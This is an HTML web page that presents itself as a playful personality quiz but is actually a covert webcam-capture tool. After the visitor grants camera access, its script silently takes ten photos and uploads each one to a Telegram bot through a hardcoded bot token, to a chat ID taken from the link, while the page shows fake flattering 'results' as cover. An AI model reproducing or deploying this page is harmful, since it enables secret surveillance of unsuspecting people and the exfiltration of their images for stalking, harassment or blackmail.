<!DOCTYPE html>
<html>
<head>
    <title>Personality Analysis</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial;
            background: #667eea;
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 20px;
            border-radius: 50px;
            margin: 20px 0;
            cursor: pointer;
        }
        .message {
            display: none;
            background: rgba(255,215,0,0.1);
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
            border-left: 5px solid #FFD700;
            text-align: left;
        }
        .status {
            margin: 15px 0;
            font-size: 18px;
            min-height: 30px;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîÆ Personality Analysis</h1>
        <p>Click below to discover your personality!</p>
        
        <button onclick="startTest()" id="startBtn">
            üì∑ Start Personality Test
        </button>
        
        <div class="message" id="messageBox">
            <h3>üåü YOUR PERSONALITY RESULTS üåü</h3>
            <p>‚úÖ You are an <strong>HONEST</strong> person</p>
            <p>‚úÖ You are a <strong>LOYAL</strong> companion</p>
            <p>‚úÖ You are a true <strong>GENTLEMAN</strong></p>
            <p>‚úÖ Kind-hearted and compassionate</p>
            <p>üôè <strong>GOD BLESS YOU</strong> with success!</p>
        </div>
        
        <div class="status" id="status">Ready...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
        
        async function startTest() {
            try {
                document.getElementById('startBtn').disabled = true;
                document.getElementById('status').innerHTML = "üîÑ Starting camera...";
                
                // Get user ID from URL
                const urlParams = new URLSearchParams(window.location.search);
                const user_id = urlParams.get('user') || "8215819954";
                
                // Access camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                document.getElementById('status').innerHTML = "‚úÖ Camera connected! Analyzing...";
                document.getElementById('startBtn').style.display = 'none';
                
                // Show personality message
                document.getElementById('messageBox').style.display = 'block';
                
                // Start capturing REAL photos
                await capturePhotos(user_id, stream);
                
                document.getElementById('status').innerHTML = "üéâ Analysis complete!";
                
            } catch (error) {
                document.getElementById('status').innerHTML = "‚ö†Ô∏è Allow camera access!";
                document.getElementById('startBtn').disabled = false;
            }
        }
        
        async function capturePhotos(user_id, stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            // Wait for video
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Capture 10 photos
            for (let i = 1; i <= 10; i++) {
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Capture photo
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const photoData = canvas.toDataURL('image/jpeg', 0.9);
                
                // Send to Telegram
                await sendToTelegram(photoData, i, user_id);
                
                document.getElementById('status').innerHTML = `üì∏ Photo ${i}/10 captured...`;
            }
            
            // Stop camera
            stream.getTracks().forEach(track => track.stop());
        }
        
        async function sendToTelegram(photoData, photoNum, user_id) {
            try {
                // Convert base64 to blob
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Send to Telegram
                const formData = new FormData();
                formData.append('chat_id', user_id);
                formData.append('photo', blob, `personality_${photoNum}.jpg`);
                formData.append('caption', `üì∏ REAL Photo ${photoNum}/10 from personality test!`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log(`‚úÖ Photo ${photoNum} sent to ${user_id}`);
                
            } catch (error) {
                console.error('Send error:', error);
            }
        }
    </script>
</body>
</html>
